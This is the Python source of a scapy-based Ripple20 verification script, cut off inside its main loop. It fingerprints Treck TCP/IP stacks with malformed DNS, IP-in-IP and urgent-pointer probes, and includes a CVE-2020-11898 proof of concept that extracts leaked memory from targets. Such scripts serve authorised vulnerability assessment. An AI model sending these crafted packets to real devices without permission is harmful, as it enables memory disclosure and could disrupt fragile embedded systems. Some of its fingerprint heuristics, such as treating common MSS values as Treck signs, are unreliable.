#!/usr/bin/env python3
"""
Ripple20 (Treck TCP/IP Stack) Vulnerability Verification Script
================================================================
Verifies the Nessus finding: "Treck TCP/IP stack multiple vulnerabilities (Ripple20)"

Ripple20 is a set of 19 vulnerabilities (CVE-2020-11896 through CVE-2020-11914)
discovered in the Treck TCP/IP stack, widely used in embedded/IoT devices.

This script performs non-destructive fingerprinting checks to determine whether
a target is likely running the Treck TCP/IP stack, which would confirm exposure
to Ripple20 vulnerabilities.

Detection Methods:
  1. TCP SYN fingerprinting (window size, options, TTL patterns)
  2. IP-in-IP encapsulation probe (CVE-2020-11896 indicator)
  3. ICMP echo behavior analysis
  4. DNS client anomaly detection (malformed response handling)
  5. TCP urgent pointer / options anomaly checks

Confirmation Mode (--confirm):
  6. CVE-2020-11898 info leak extraction — sends crafted ICMP/IPv4 packets
     to confirm the Treck stack leaks memory contents in responses.

Usage:
  sudo python3 ripple20.py --target <IP> [options]

Requirements:
  - Python 3.7+
  - scapy (pip install scapy)
  - Root/sudo privileges (for raw socket access)

DISCLAIMER:
  This tool is intended for authorized security assessments only.
  Only use against systems you have explicit permission to test.
"""

import argparse
import ipaddress
import json
import logging
import os
import sys
import time
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional

try:
    from scapy.all import (
        IP, TCP, UDP, ICMP, DNS, DNSQR, Raw,
        sr1, sr, send, conf, RandShort,
        IPOption_RR, IPOption_LSRR,
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False


# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

RIPPLE20_CVES = {
    "CVE-2020-11896": {
        "cvss": 10.0,
        "title": "Improper handling of IP-in-IP tunneling (RCE)",
        "severity": "Critical",
    },
    "CVE-2020-11897": {
        "cvss": 10.0,
        "title": "IPv6 out-of-bounds write (RCE)",
        "severity": "Critical",
    },
    "CVE-2020-11898": {
        "cvss": 9.1,
        "title": "IPv4/ICMPv4 info leak",
        "severity": "Critical",
    },
    "CVE-2020-11899": {
        "cvss": 5.4,
        "title": "IPv6 out-of-bounds read",
        "severity": "Medium",
    },
    "CVE-2020-11900": {
        "cvss": 8.2,
        "title": "IPv4 tunneling double-free (RCE)",
        "severity": "High",
    },
    "CVE-2020-11901": {
        "cvss": 9.0,
        "title": "DNS response parsing RCE",
        "severity": "Critical",
    },
    "CVE-2020-11902": {
        "cvss": 7.3,
        "title": "IPv6 over IPv4 OOB read",
        "severity": "High",
    },
    "CVE-2020-11903": {
        "cvss": 5.3,
        "title": "DHCP info leak",
        "severity": "Medium",
    },
    "CVE-2020-11904": {
        "cvss": 5.6,
        "title": "Integer overflow in memory allocation",
        "severity": "Medium",
    },
    "CVE-2020-11905": {
        "cvss": 5.6,
        "title": "DHCPv6 info leak",
        "severity": "Medium",
    },
    "CVE-2020-11906": {
        "cvss": 5.0,
        "title": "Ethernet link layer integer underflow",
        "severity": "Medium",
    },
    "CVE-2020-11907": {
        "cvss": 5.0,
        "title": "TCP urgent data OOB handling",
        "severity": "Medium",
    },
    "CVE-2020-11908": {
        "cvss": 3.1,
        "title": "DHCP null termination info leak",
        "severity": "Low",
    },
    "CVE-2020-11909": {
        "cvss": 3.7,
        "title": "IPv4 integer underflow",
        "severity": "Low",
    },
    "CVE-2020-11910": {
        "cvss": 3.7,
        "title": "ICMPv4 OOB read",
        "severity": "Low",
    },
    "CVE-2020-11911": {
        "cvss": 3.7,
        "title": "ICMPv4 access control issue",
        "severity": "Low",
    },
    "CVE-2020-11912": {
        "cvss": 3.7,
        "title": "TCP OOB read",
        "severity": "Low",
    },
    "CVE-2020-11913": {
        "cvss": 3.7,
        "title": "IPv6 OOB read",
        "severity": "Low",
    },
    "CVE-2020-11914": {
        "cvss": 3.1,
        "title": "ARP info leak",
        "severity": "Low",
    },
}

# Known Treck TCP fingerprint characteristics
# Narrowed to sizes more distinctive to embedded/Treck stacks;
# common OS defaults (e.g. 65535, 29200, 64240) are excluded.
TRECK_WINDOW_SIZES = {1024, 2048, 4096, 8192, 16384}
# TTL=64 (Linux) and TTL=128 (Windows) are too generic to be useful.
# Only TTL=255 is uncommon enough to be a meaningful Treck indicator.
TRECK_TTL_VALUES = {255}

# ---------------------------------------------------------------------------
# Logging setup
# ---------------------------------------------------------------------------

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)-7s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("ripple20")


# ---------------------------------------------------------------------------
# Data classes
# ---------------------------------------------------------------------------

@dataclass
class CheckResult:
    """Result of a single verification check."""
    name: str
    status: str  # "LIKELY_VULNERABLE", "POSSIBLE", "NOT_DETECTED", "ERROR"
    confidence: float  # 0.0 – 1.0
    details: str = ""
    related_cves: list = field(default_factory=list)


@dataclass
class ConfirmationResult:
    """Result of a post-verification confirmation PoC."""
    name: str
    status: str  # "CONFIRMED_VULNERABLE", "NOT_CONFIRMED", "ERROR"
    details: str = ""
    related_cves: list = field(default_factory=list)
    leaked_bytes: bytes = b""
    leaked_hex: str = ""


@dataclass
class VerificationReport:
    """Aggregated report of all checks."""
    target: str
    timestamp: str
    checks: list = field(default_factory=list)
    overall_status: str = "UNKNOWN"
    overall_confidence: float = 0.0
    treck_stack_indicators: int = 0
    recommendation: str = ""
    confirmation: Optional[ConfirmationResult] = None


# ---------------------------------------------------------------------------
# Check functions
# ---------------------------------------------------------------------------

def check_tcp_fingerprint(target: str, port: int, timeout: int) -> CheckResult:
    """
    Check 1: TCP SYN fingerprinting
    --------------------------------
    Sends a TCP SYN and examines the SYN-ACK for Treck-characteristic traits:
      - Specific window sizes commonly used by Treck
      - TCP options ordering (MSS, NOP, WScale pattern)
      - TTL values typical of Treck devices
      - Lack of TCP timestamp option (common in Treck)
    """
    result = CheckResult(
        name="TCP SYN Fingerprint Analysis",
        status="NOT_DETECTED",
        confidence=0.0,
        related_cves=["CVE-2020-11907", "CVE-2020-11912"],
    )

    try:
        log.info(f"[Check 1] Sending TCP SYN to {target}:{port}")
        syn = IP(dst=target) / TCP(
            dport=port, sport=RandShort(), flags="S", seq=1000
        )
        resp = sr1(syn, timeout=timeout, verbose=0)

        if resp is None:
            result.status = "ERROR"
            result.details = f"No response to SYN on port {port}. Host may be down or port filtered."
            return result

        if not resp.haslayer(TCP):
            result.status = "ERROR"
            result.details = "Response did not contain a TCP layer."
            return result

        tcp = resp[TCP]
        ip_layer = resp[IP]
        indicators = []
        score = 0.0

        # --- Window size ---
        win = tcp.window
        if win in TRECK_WINDOW_SIZES:
            indicators.append(f"Window size {win} matches known Treck value")
            score += 0.2

        # --- TTL ---
        ttl = ip_layer.ttl
        if ttl in TRECK_TTL_VALUES:
            indicators.append(f"TTL={ttl} is consistent with Treck stack")
            score += 0.1

        # --- TCP options analysis ---
        opts = tcp.options
        opt_names = [o[0] if isinstance(o, tuple) else o for o in opts]

        has_timestamp = "Timestamp" in opt_names
        has_mss = "MSS" in opt_names
        has_wscale = "WScale" in opt_names
        has_sack = "SAckOK" in opt_names

        # Treck typically: MSS present, no Timestamp, may have WScale
        if has_mss and not has_timestamp:
            indicators.append("MSS present without Timestamp option (Treck pattern)")
            score += 0.25

        if has_mss and not has_sack:
            indicators.append("No SACK permitted option (common in Treck)")
            score += 0.1

        # Minimal options set (Treck tends to have fewer options)
        if len(opts) <= 3:
            indicators.append(f"Minimal TCP options count ({len(opts)}) suggests embedded stack")
            score += 0.15

        # Check DF bit behavior
        if ip_layer.flags.DF:
            indicators.append("DF bit set in response")
            score += 0.05

        # MSS value check – Treck often uses specific MSS values
        if has_mss:
            mss_val = [o[1] for o in opts if isinstance(o, tuple) and o[0] == "MSS"]
            if mss_val:
                mss = mss_val[0]
                if mss in (536, 1460, 1400, 1380):
                    indicators.append(f"MSS={mss} is common in Treck implementations")
                    score += 0.1

        result.confidence = min(score, 1.0)
        result.details = "; ".join(indicators) if indicators else "No Treck-specific TCP traits detected."

        if score >= 0.5:
            result.status = "LIKELY_VULNERABLE"
        elif score >= 0.25:
            result.status = "POSSIBLE"
        else:
            result.status = "NOT_DETECTED"

    except Exception as e:
        result.status = "ERROR"
        result.details = f"TCP fingerprint check failed: {e}"

    return result


def check_ip_in_ip_tunneling(target: str, timeout: int) -> CheckResult:
    """
    Check 2: IP-in-IP encapsulation probe
    ----------------------------------------
    Sends an IP packet with protocol 4 (IP-in-IP encapsulation) to test whether
    the target processes encapsulated packets, which is the attack vector for
    CVE-2020-11896 (CVSS 10.0).

    A Treck stack may respond to or process IP-in-IP without proper validation.
    """
    result = CheckResult(
        name="IP-in-IP Tunneling Probe (CVE-2020-11896)",
        status="NOT_DETECTED",
        confidence=0.0,
        related_cves=["CVE-2020-11896", "CVE-2020-11900", "CVE-2020-11902"],
    )

    try:
        log.info("[Check 2] Sending IP-in-IP encapsulated probe")

        # Outer IP with inner IP payload (protocol 4 = IP-in-IP)
        inner_ip = IP(dst=target, src="10.0.0.1") / ICMP(type=8, code=0)
        outer_ip = IP(dst=target, proto=4) / Raw(load=bytes(inner_ip))

        resp = sr1(outer_ip, timeout=timeout, verbose=0)

        if resp is None:
            result.details = (
                "No response to IP-in-IP probe. Most hosts silently drop protocol 4 "
                "packets — this alone is not indicative of the Treck stack."
            )
            return result

        indicators = []
        score = 0.0

        # If we get an ICMP response, the inner packet was processed
        if resp.haslayer(ICMP):
            icmp = resp[ICMP]
            if icmp.type == 0:  # Echo reply to the inner ICMP
                indicators.append("Target responded to ICMP inside IP-in-IP tunnel — strong Treck indicator")
                score += 0.7
            elif icmp.type == 3:  # Destination unreachable
                indicators.append("ICMP unreachable returned — target parsed the encapsulated packet")
                score += 0.4
            elif icmp.type == 11:  # TTL exceeded
                indicators.append("TTL exceeded for tunneled packet — encapsulation was processed")
                score += 0.5

        # Any IP-level response to protocol 4 is noteworthy
        if resp.haslayer(IP):
            indicators.append(f"Received IP response (TTL={resp[IP].ttl})")
            score += 0.1

        result.confidence = min(score, 1.0)
        result.details = "; ".join(indicators) if indicators else "IP-in-IP not processed."

        if score >= 0.5:
            result.status = "LIKELY_VULNERABLE"
        elif score >= 0.2:
            result.status = "POSSIBLE"

    except Exception as e:
        result.status = "ERROR"
        result.details = f"IP-in-IP check failed: {e}"

    return result


def check_icmp_behavior(target: str, timeout: int) -> CheckResult:
    """
    Check 3: ICMP behavior analysis
    ---------------------------------
    Sends various ICMP probes and analyzes responses for Treck-specific behavior:
      - Response to non-standard ICMP types
      - ICMP echo reply payload handling
      - TTL and ID field patterns
    Related to CVE-2020-11898, CVE-2020-11910, CVE-2020-11911.
    """
    result = CheckResult(
        name="ICMP Behavior Analysis",
        status="NOT_DETECTED",
        confidence=0.0,
        related_cves=["CVE-2020-11898", "CVE-2020-11910", "CVE-2020-11911"],
    )

    try:
        log.info("[Check 3] Analyzing ICMP echo behavior")
        indicators = []
        score = 0.0

        # --- Standard echo with large payload ---
        payload = b"RIPPLE20CHECK" * 10
        echo = IP(dst=target) / ICMP(type=8, code=0, id=0x1337, seq=1) / Raw(load=payload)
        resp = sr1(echo, timeout=timeout, verbose=0)

        if resp and resp.haslayer(ICMP):
            icmp = resp[ICMP]

            # Check if payload is echoed correctly
            if resp.haslayer(Raw):
                resp_payload = resp[Raw].load
                if resp_payload == payload:
                    indicators.append("ICMP payload echoed correctly")
                elif len(resp_payload) != len(payload):
                    indicators.append(
                        f"ICMP payload length mismatch (sent {len(payload)}, "
                        f"got {len(resp_payload)}) — possible info leak indicator"
                    )
                    score += 0.3

            # Check IP ID field pattern
            if resp.haslayer(IP):
                ip_id = resp[IP].id
                if ip_id == 0:
                    indicators.append("IP ID=0 in ICMP reply (some Treck versions)")
                    score += 0.15

        # --- ICMP with unusual code ---
        echo_unusual = IP(dst=target) / ICMP(type=8, code=128, id=0x1338, seq=2)
        resp2 = sr1(echo_unusual, timeout=timeout, verbose=0)

        if resp2 and resp2.haslayer(ICMP):
            if resp2[ICMP].type == 0:
                indicators.append("Responded to ICMP echo with non-standard code=128 (permissive stack)")
                score += 0.2

        # --- Timestamp request ---
        ts = IP(dst=target) / ICMP(type=13, code=0, id=0x1339, seq=3)
        resp3 = sr1(ts, timeout=timeout, verbose=0)

        if resp3 and resp3.haslayer(ICMP):
            if resp3[ICMP].type == 14:
                indicators.append("ICMP timestamp reply received (Treck may support this)")
                score += 0.1

        # --- Collect TTL values for consistency ---
        ttl_values = set()
        for r in [resp, resp2, resp3]:
            if r and r.haslayer(IP):
                ttl_values.add(r[IP].ttl)

        if len(ttl_values) == 1 and ttl_values.issubset(TRECK_TTL_VALUES):
            indicators.append(f"Consistent TTL={next(iter(ttl_values))} across probes")
            score += 0.1

        result.confidence = min(score, 1.0)
        result.details = "; ".join(indicators) if indicators else "No Treck-specific ICMP behavior detected."

        if score >= 0.45:
            result.status = "LIKELY_VULNERABLE"
        elif score >= 0.2:
            result.status = "POSSIBLE"

    except Exception as e:
        result.status = "ERROR"
        result.details = f"ICMP behavior check failed: {e}"

    return result


def check_dns_anomaly(target: str, timeout: int) -> CheckResult:
    """
    Check 4: DNS client anomaly detection
    ----------------------------------------
    Sends a crafted DNS response to detect Treck DNS parsing behavior
    related to CVE-2020-11901 (CVSS 9.0 — DNS response parsing RCE).

    This check sends a benign DNS query to the target to see if it has
    an open DNS port and analyzes response patterns.
    """
    result = CheckResult(
        name="DNS Response Behavior (CVE-2020-11901)",
        status="NOT_DETECTED",
        confidence=0.0,
        related_cves=["CVE-2020-11901"],
    )

    try:
        log.info("[Check 4] Probing DNS behavior on target")
        indicators = []
        score = 0.0

        # Check if DNS port is open
        dns_query = (
            IP(dst=target)
            / UDP(dport=53, sport=RandShort())
            / DNS(rd=1, qd=DNSQR(qname="test.example.com", qtype="A"))
        )
        resp = sr1(dns_query, timeout=timeout, verbose=0)

        if resp is None:
            result.details = "No DNS response — port 53 may be closed or filtered."
            return result

        if resp.haslayer(DNS):
            dns = resp[DNS]
            indicators.append(f"DNS service responding (rcode={dns.rcode})")

            # Check for implementation-specific quirks
            if dns.rcode == 0:
                indicators.append("DNS query accepted")
                score += 0.1

            # Treck DNS may have unusual ID handling
            if resp.haslayer(UDP):
                if resp[UDP].sport == 53:
                    indicators.append("Standard DNS source port")
                    score += 0.05

        if resp.haslayer(IP):
            if resp[IP].ttl in TRECK_TTL_VALUES:
                indicators.append(f"DNS response TTL={resp[IP].ttl} consistent with Treck")
                score += 0.1

        # Send a DNS query with maximum-length label
        long_label = "a" * 63
        long_query = (
            IP(dst=target)
            / UDP(dport=53, sport=RandShort())
            / DNS(rd=1, qd=DNSQR(qname=f"{long_label}.example.com", qtype="A"))
        )
        resp2 = sr1(long_query, timeout=timeout, verbose=0)

        if resp2 and resp2.haslayer(DNS):
            indicators.append("Accepted max-length DNS label query")
            score += 0.1

        # Probe with a DNS packet containing a compression pointer loop.
        # Treck's DNS parser (CVE-2020-11901) may crash or respond abnormally
        # to malformed compression pointers, while robust stacks reject them.
        # Craft a minimal DNS response-style packet with a pointer to itself (offset 0x0C).
        dns_comp_payload = (
            b"\x00\x01"   # Transaction ID
            b"\x01\x00"   # Flags: standard query
            b"\x00\x01"   # Questions: 1
            b"\x00\x00"   # Answer RRs: 0
            b"\x00\x00"   # Authority RRs: 0
            b"\x00\x00"   # Additional RRs: 0
            b"\xc0\x0c"   # Compression pointer loop (points back to offset 12 = itself)
            b"\x00\x01"   # Type A
            b"\x00\x01"   # Class IN
        )
        comp_pkt = (
            IP(dst=target)
            / UDP(dport=53, sport=RandShort())
            / Raw(load=dns_comp_payload)
        )
        resp3 = sr1(comp_pkt, timeout=timeout, verbose=0)

        if resp3 and resp3.haslayer(UDP):
            if resp3.haslayer(DNS):
                indicators.append(
                    "Responded to DNS compression pointer loop — possible Treck parser quirk"
                )
                score += 0.25
            elif resp3.haslayer(Raw):
                indicators.append(
                    "Non-DNS UDP response to malformed compression pointer — unusual behavior"
                )
                score += 0.3

        # Probe with a truncated DNS query (missing QNAME terminator)
        dns_trunc_payload = (
            b"\x00\x02"   # Transaction ID
            b"\x01\x00"   # Flags: standard query
            b"\x00\x01"   # Questions: 1
            b"\x00\x00"   # Answer RRs: 0
            b"\x00\x00"   # Authority RRs: 0
            b"\x00\x00"   # Additional RRs: 0
            b"\x04test"   # Partial QNAME with no null terminator
        )
        trunc_pkt = (
            IP(dst=target)
            / UDP(dport=53, sport=RandShort())
            / Raw(load=dns_trunc_payload)
        )
        resp4 = sr1(trunc_pkt, timeout=timeout, verbose=0)

        if resp4 and resp4.haslayer(UDP):
            indicators.append(
                "Responded to truncated DNS query — weak input validation (Treck-like)"
            )
            score += 0.25

        result.confidence = min(score, 1.0)
        result.details = "; ".join(indicators) if indicators else "DNS not available or no anomalies detected."

        if score >= 0.4:
            result.status = "LIKELY_VULNERABLE"
        elif score >= 0.2:
            result.status = "POSSIBLE"

    except Exception as e:
        result.status = "ERROR"
        result.details = f"DNS anomaly check failed: {e}"

    return result


def check_tcp_urgent_pointer(target: str, port: int, timeout: int) -> CheckResult:
    """
    Check 5: TCP Urgent pointer / options anomaly
    ------------------------------------------------
    Tests the target's handling of TCP urgent data, related to CVE-2020-11907.
    Treck's TCP implementation may mishandle the urgent pointer, leading to
    out-of-bounds access.
    """
    result = CheckResult(
        name="TCP Urgent Pointer Handling (CVE-2020-11907)",
        status="NOT_DETECTED",
        confidence=0.0,
        related_cves=["CVE-2020-11907"],
    )

    try:
        log.info(f"[Check 5] Testing TCP urgent pointer handling on {target}:{port}")
        indicators = []
        score = 0.0

        # First establish a SYN
        syn = IP(dst=target) / TCP(
            dport=port, sport=RandShort(), flags="S", seq=100
        )
        syn_ack = sr1(syn, timeout=timeout, verbose=0)

        if syn_ack is None or not syn_ack.haslayer(TCP):
            result.details = "Could not establish TCP handshake."
            result.status = "ERROR"
            return result

        if not (syn_ack[TCP].flags.S and syn_ack[TCP].flags.A):  # SYN-ACK
            # Send RST to clean up the half-open connection
            rst = IP(dst=target) / TCP(
                dport=port, sport=syn[TCP].sport, flags="R", seq=101,
            )
            send(rst, verbose=0)
            result.details = f"Unexpected TCP flags: {syn_ack[TCP].flags}"
            return result

        # Complete handshake
        ack_seq = syn_ack[TCP].seq + 1
        ack = IP(dst=target) / TCP(
            dport=port,
            sport=syn[TCP].sport,
            flags="A",
            seq=101,
            ack=ack_seq,
        )
        send(ack, verbose=0)
        time.sleep(0.2)

        # Send packet with URG flag and large urgent pointer
        urg_pkt = IP(dst=target) / TCP(
            dport=port,
            sport=syn[TCP].sport,
            flags="PAU",  # PSH + ACK + URG
            seq=101,
            ack=ack_seq,
            urgptr=0xFFFF,
        ) / Raw(load=b"TEST")

        resp = sr1(urg_pkt, timeout=timeout, verbose=0)

        if resp and resp.haslayer(TCP):
            tcp_resp = resp[TCP]

            if tcp_resp.flags & 0x04:  # RST
                indicators.append("RST received after urgent pointer — standard behavior")
            elif tcp_resp.flags & 0x10:  # ACK
                indicators.append("ACK received for oversized urgent pointer — may indicate Treck")
                score += 0.35
            if tcp_resp.flags & 0x20:  # URG
                indicators.append("URG flag echoed back — unusual behavior")
                score += 0.2
        elif resp is None:
            indicators.append("No response to URG packet — connection may have been silently dropped")
            score += 0.1

        # Clean up: send RST
        rst = IP(dst=target) / TCP(
            dport=port,
            sport=syn[TCP].sport,
            flags="R",
            seq=105,
        )
        send(rst, verbose=0)

        result.confidence = min(score, 1.0)
        result.details = "; ".join(indicators) if indicators else "No URG pointer anomalies detected."

        if score >= 0.4:
            result.status = "LIKELY_VULNERABLE"
        elif score >= 0.2:
            result.status = "POSSIBLE"

    except Exception as e:
        result.status = "ERROR"
        result.details = f"TCP URG check failed: {e}"

    return result


# ---------------------------------------------------------------------------
# Confirmation PoC
# ---------------------------------------------------------------------------

def confirm_info_leak(target: str, timeout: int) -> ConfirmationResult:
    """
    Confirmation PoC: CVE-2020-11898 — IPv4/ICMPv4 Information Leak
    -----------------------------------------------------------------
    Sends crafted ICMP echo requests designed to trigger a buffer length
    miscalculation in the Treck TCP/IP stack.  When vulnerable, the stack
    includes adjacent heap/stack memory in the ICMP echo reply, producing
    a response payload that is longer than — or differs from — what was sent.

    This is non-destructive: the target is not crashed or modified.

    Three probes are used:
      A) ICMP echo with IP Record-Route option  (forces header-length math)
      B) ICMP echo with Loose-Source-Route option
      C) ICMP echo with an IP header whose total-length field is artificially
         *shorter* than the actual payload (Treck may pad with memory)
    """
    result = ConfirmationResult(
        name="CVE-2020-11898 Info Leak Confirmation",
        status="NOT_CONFIRMED",
        related_cves=["CVE-2020-11898", "CVE-2020-11910"],
    )

    try:
        log.info("[Confirm] Running CVE-2020-11898 info leak extraction probes")
        all_leaked = b""
        indicators = []

        # Use a short, recognisable payload so leaked bytes are obvious
        marker = b"\xaa\xbb\xcc\xdd"
        payload = marker * 4  # 16 bytes

        # --- Probe A: ICMP echo with IP Record-Route option ---
        # The RR option forces the Treck stack to recalculate header length;
        # a buggy implementation may copy more response data than intended.
        log.info("[Confirm]   Probe A: ICMP echo + IP Record-Route option")
        pkt_a = (
            IP(dst=target, options=[IPOption_RR(pointer=4, routers=["0.0.0.0"] * 9)])
            / ICMP(type=8, code=0, id=0x200A, seq=1)
            / Raw(load=payload)
        )
        resp_a = sr1(pkt_a, timeout=timeout, verbose=0)
        leaked_a = _check_leak(resp_a, payload, "Record-Route", indicators)
        all_leaked += leaked_a

        # --- Probe B: ICMP echo with Loose-Source-Route option ---
        log.info("[Confirm]   Probe B: ICMP echo + Loose-Source-Route option")
        pkt_b = (
            IP(dst=target, options=[IPOption_LSRR(pointer=4, routers=[target])])
            / ICMP(type=8, code=0, id=0x200B, seq=2)
            / Raw(load=payload)
        )
        resp_b = sr1(pkt_b, timeout=timeout, verbose=0)
        leaked_b = _check_leak(resp_b, payload, "LSRR", indicators)
        all_leaked += leaked_b

        # --- Probe C: ICMP echo with understated IP total-length ---
        # We build the packet normally, then patch the IP length field to be
        # shorter than the real payload.  A vulnerable Treck stack trusts its
        # own (correct) buffer size for the reply, leaking the delta.
        # We must send at L3 raw to prevent scapy from recalculating the
        # length and checksum, which would undo the patch.
        log.info("[Confirm]   Probe C: ICMP echo with short IP total-length")
        pkt_c_base = IP(dst=target) / ICMP(type=8, code=0, id=0xC20C, seq=3) / Raw(load=payload)
        pkt_c_raw = bytearray(bytes(pkt_c_base))
        # Subtract 8 bytes from the IP total-length field (bytes 2-3)
        orig_len = int.from_bytes(pkt_c_raw[2:4], "big")
        patched_len = max(orig_len - 8, 28)  # keep at least IP+ICMP headers
        pkt_c_raw[2:4] = patched_len.to_bytes(2, "big")
        # Recalculate IP header checksum after patching length
        pkt_c_raw[10:12] = b"\x00\x00"  # zero checksum before calc
        ihl = (pkt_c_raw[0] & 0x0F) * 4
        chk = _ip_checksum(bytes(pkt_c_raw[:ihl]))
        pkt_c_raw[10:12] = chk.to_bytes(2, "big")
        # Send the raw patched packet and sniff for a reply
        send(IP(bytes(pkt_c_raw)), verbose=0)
        # Use a normal ICMP echo (same id/seq) immediately after to check
        # if the target was confused by the malformed packet
        pkt_c_follow = IP(dst=target) / ICMP(type=8, code=0, id=0xC20C, seq=4) / Raw(load=payload)
        resp_c = sr1(pkt_c_follow, timeout=timeout, verbose=0)
        leaked_c = _check_leak(resp_c, payload, "short-totlen-followup", indicators)
        all_leaked += leaked_c

        # --- Verdict ---
        if all_leaked:
            result.status = "CONFIRMED_VULNERABLE"
            result.leaked_bytes = all_leaked
            result.leaked_hex = all_leaked.hex(":")
            result.details = "; ".join(indicators)
        else:
            result.details = (
                "No extra bytes detected in ICMP replies. "
                + ("; ".join(indicators) if indicators else "All probes returned expected payloads.")
            )

    except Exception as e:
        result.status = "ERROR"
        result.details = f"Info leak confirmation failed: {e}"

    return result


def _ip_checksum(header: bytes) -> int:
    """Compute the RFC 1071 IP header checksum."""
    if len(header) % 2:
        header += b"\x00"
    s = sum(int.from_bytes(header[i:i+2], "big") for i in range(0, len(header), 2))
    while s >> 16:
        s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


def _check_leak(resp, sent_payload: bytes, probe_name: str, indicators: list) -> bytes:
    """Compare an ICMP echo reply payload against what was sent.  Returns any leaked bytes."""
    if resp is None:
        indicators.append(f"{probe_name}: no response")
        return b""

    if not resp.haslayer(ICMP):
        indicators.append(f"{probe_name}: response has no ICMP layer")
        return b""

    icmp_type = resp[ICMP].type
    if icmp_type != 0:
        if icmp_type == 3:
            indicators.append(f"{probe_name}: ICMP dest-unreachable (code={resp[ICMP].code}) — target rejected crafted packet")
        else:
            indicators.append(f"{probe_name}: non-echo-reply ICMP type={icmp_type}")
        return b""

    resp_data = bytes(resp[Raw].load) if resp.haslayer(Raw) else b""

    if len(resp_data) > len(sent_payload):
        extra = resp_data[len(sent_payload):]
        # Filter out zero-padding — only count non-zero leaked bytes
        if any(b != 0 for b in extra):
            indicators.append(
                f"{probe_name}: reply {len(resp_data)}B > sent {len(sent_payload)}B — "
                f"leaked {len(extra)} bytes: {extra.hex(':')}"
            )
            return extra
        else:
            indicators.append(f"{probe_name}: reply padded with zeros (no leak)")
    elif resp_data != sent_payload[:len(resp_data)]:
        # Same length but different content — possible overwrite from adjacent memory
        differing = bytes(r ^ s for r, s in zip(resp_data, sent_payload))
        if any(b != 0 for b in differing):
            indicators.append(
                f"{probe_name}: reply payload differs from sent — "
                f"XOR delta: {differing.hex(':')}"
            )
            return differing
    else:
        indicators.append(f"{probe_name}: payload echoed correctly (no leak)")

    return b""


# ---------------------------------------------------------------------------
# Report generation
# ---------------------------------------------------------------------------

def generate_report(report: VerificationReport) -> str:
    """Build a human-readable text report."""
    lines = []
    sep = "=" * 72

    lines.append(sep)
    lines.append("  RIPPLE20 VERIFICATION REPORT")
    lines.append("  Treck TCP/IP Stack Multiple Vulnerabilities")
    lines.append(sep)
    lines.append(f"  Target:     {report.target}")
    lines.append(f"  Timestamp:  {report.timestamp}")
    lines.append(f"  Status:     {report.overall_status}")
    lines.append(f"  Confidence: {report.overall_confidence:.0%}")
    lines.append(sep)
    lines.append("")

    for i, check in enumerate(report.checks, 1):
        status_icon = {
            "LIKELY_VULNERABLE": "[!!]",
            "POSSIBLE": "[? ]",
            "NOT_DETECTED": "[OK]",
            "ERROR": "[ER]",
        }.get(check.status, "[??]")

        lines.append(f"  Check {i}: {check.name}")
        lines.append(f"    Status:     {status_icon} {check.status}")
        lines.append(f"    Confidence: {check.confidence:.0%}")
        lines.append(f"    Details:    {check.details}")
        if check.related_cves:
            lines.append(f"    CVEs:       {', '.join(check.related_cves)}")
        lines.append("")

    lines.append(sep)
    lines.append("  OVERALL ASSESSMENT")
    lines.append(sep)
    lines.append(f"  Treck Stack Indicators: {report.treck_stack_indicators} / {len(report.checks)}")
    lines.append(f"  Verdict:   {report.overall_status}")
    lines.append(f"  Confidence: {report.overall_confidence:.0%}")
    lines.append("")
    lines.append(f"  Recommendation:")
    lines.append(f"    {report.recommendation}")
    lines.append("")

    if report.confirmation:
        c = report.confirmation
        conf_icon = {
            "CONFIRMED_VULNERABLE": "[!!]",
            "NOT_CONFIRMED": "[OK]",
            "ERROR": "[ER]",
        }.get(c.status, "[??]")

        lines.append(sep)
        lines.append("  CONFIRMATION PoC")
        lines.append(sep)
        lines.append(f"  {c.name}")
        lines.append(f"    Status:  {conf_icon} {c.status}")
        lines.append(f"    Details: {c.details}")
        if c.leaked_hex:
            lines.append(f"    Leaked:  {c.leaked_hex}")
            lines.append(f"    Bytes:   {len(c.leaked_bytes)} bytes extracted from target memory")
        if c.related_cves:
            lines.append(f"    CVEs:    {', '.join(c.related_cves)}")
        lines.append("")

    if report.overall_status in ("LIKELY_VULNERABLE", "POSSIBLE") or (
        report.confirmation and report.confirmation.status == "CONFIRMED_VULNERABLE"
    ):
        lines.append("  ASSOCIATED CVEs:")
        lines.append("  " + "-" * 68)
        for cve, info in RIPPLE20_CVES.items():
            lines.append(f"    {cve} (CVSS {info['cvss']:>4.1f}) [{info['severity']:>8s}] {info['title']}")
        lines.append("")

    lines.append(sep)
    lines.append("  DISCLAIMER: This is a best-effort fingerprinting assessment.")
    lines.append("  False positives/negatives are possible. Confirm with vendor")
    lines.append("  documentation and firmware version analysis.")
    lines.append(sep)

    return "\n".join(lines)


def generate_json_report(report: VerificationReport) -> str:
    """Build a machine-readable JSON report."""
    data = {
        "target": report.target,
        "timestamp": report.timestamp,
        "overall_status": report.overall_status,
        "overall_confidence": report.overall_confidence,
        "treck_stack_indicators": report.treck_stack_indicators,
        "recommendation": report.recommendation,
        "checks": [
            {
                "name": c.name,
                "status": c.status,
                "confidence": c.confidence,
                "details": c.details,
                "related_cves": c.related_cves,
            }
            for c in report.checks
        ],
        "ripple20_cves": RIPPLE20_CVES,
        "confirmation": None,
    }
    if report.confirmation:
        c = report.confirmation
        data["confirmation"] = {
            "name": c.name,
            "status": c.status,
            "details": c.details,
            "related_cves": c.related_cves,
            "leaked_hex": c.leaked_hex,
            "leaked_bytes_count": len(c.leaked_bytes),
        }
    return json.dumps(data, indent=2)


# ---------------------------------------------------------------------------
# Main orchestrator
# ---------------------------------------------------------------------------

def run_verification(target: str, port: int = 80, timeout: int = 5,
                     checks_to_run: Optional[list] = None) -> VerificationReport:
    """Execute all verification checks and compile the report."""

    report = VerificationReport(
        target=target,
        timestamp=datetime.now(timezone.utc).isoformat(),
    )

    all_checks = [
        ("tcp_fingerprint", lambda: check_tcp_fingerprint(target, port, timeout)),
        ("ip_in_ip",        lambda: check_ip_in_ip_tunneling(target, timeout)),
        ("icmp_behavior",   lambda: check_icmp_behavior(target, timeout)),
        ("dns_anomaly",     lambda: check_dns_anomaly(target, timeout)),
        ("tcp_urgent",      lambda: check_tcp_urgent_pointer(target, port, timeout)),
    ]

    for name, check_fn in all_checks:
